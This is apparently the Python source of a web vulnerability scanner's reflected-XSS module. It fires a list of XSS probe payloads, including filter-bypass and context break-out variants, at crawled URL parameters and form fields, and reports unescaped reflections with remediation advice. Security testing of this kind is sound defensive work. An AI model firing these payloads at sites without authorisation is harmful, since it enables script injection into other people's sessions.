from __future__ import annotations
from urllib.parse import urlparse, urlunparse
from .base import BaseModule
from ..scanner import Finding, HIGH, mutate_query

class XSSModule(BaseModule):
    name = "Cross-Site Scripting"
    category = "Injection"

    def run(self):
        # _confirmed tracks (base_url, param) pairs already reported so we emit
        # one finding per vulnerable parameter, not one per payload variant.
        self._confirmed: set[tuple[str, str]] = set()

        payloads = [
            # Reflected XSS — break-out probes
            'xploit"><svg/onload=alert(1)>',
            'xploit"><img src=x onerror=alert(1)>',
            'xploit\'><script>alert(1)</script>',
            'xploit"><details open ontoggle=alert(1)>',
            'xploit"><iframe src="javascript:alert(1)">',
            'xploit" onmouseover="alert(1)',
            'xploit"><a href="javascript:alert(1)">click</a>',
            'xploit"><video><source onerror=alert(1)>',
            'xploit"><body onload=alert(1)>',
            'xploit"><marquee onstart=alert(1)>',
            # DOM / href-sink probes
            '<img src=x onerror=alert(document.domain)>',
            'javascript:alert(document.cookie)',
            '<svg onload=alert(1)>',
            # Filter bypass variants
            '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
            '<IMG SRC=x OnErRoR=alert(1)>',
            '<img src=x onerror=alert(1)>',
            # Advanced context probes
            'xploit"><math><mtext><option><annotation encoding="text/html"><svg/onload=alert(1)></annotation></option></mtext></math>',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
        ]
        for payload in payloads:
            for url in list(self.scanner.pages):
                self._check_url(url, payload)
            for form in self.scanner.forms:
                self._check_form(form, payload)

    @staticmethod
    def _base_url(url: str) -> str:
        """Strip query string and fragment — used as the canonical finding URL."""
        p = urlparse(url)
        return urlunparse((p.scheme, p.netloc, p.path, "", "", ""))

    def _check_url(self, url, payload):
        from ..scanner import query_parameters
        for param in query_parameters(url):
            base = self._base_url(url)
            if (base, param) in self._confirmed:
                continue
            target_url = mutate_query(url, param, payload)
            res = self.scanner._request("GET", target_url)
            if res:
                self._analyze_reflection(res, base, param, payload, "GET")

    def _check_form(self, form, payload):
        base = self._base_url(form.action)
        for param in form.inputs:
            if (base, param) in self._confirmed:
                continue
            data = dict(form.inputs)
            data[param] = payload
            if form.method == "GET":
                res = self.scanner._request("GET", form.action, params=data)
            else:
                res = self.scanner._request("POST", form.action, data=data)
            if res:
                self._analyze_reflection(res, base, param, payload, form.method)

    def _analyze_reflection(self, response, base_url, parameter, payload, method):
        if "text/html" not in response.headers.get("Content-Type", "").lower():
            return
        if payload not in response.text:
            return

        # Confirm the dangerous marker is within the reflected payload window,
        # not somewhere else in the page's own markup.
        idx = response.text.find(payload)
        context = response.text[max(0, idx - 20) : idx + len(payload) + 20]
        if any(p in context for p in ["<svg", "<img", "<script", "onerror", "onload", "ontoggle", "onmouseover", "onstart", "javascript:"]):
            self._confirmed.add((base_url, parameter))
            self.add_finding(Finding(
                id="XSS-001",
                name="Reflected XSS",
                category="Cross-Site Scripting",
                severity=HIGH,
                confidence="High",
                url=base_url,
                parameter=parameter,
                method=method,
                evidence=f"Payload reflected unescaped into HTML: {payload[:60]}",
                trigger=f"payload={payload}",
                impact="Reflected HTML injection was observed in the response DOM. If a browser executes the injected context, attackers could run script in a victim's session.",
                remediation="Apply context-aware output encoding.",
                cwe="CWE-79"
            ))
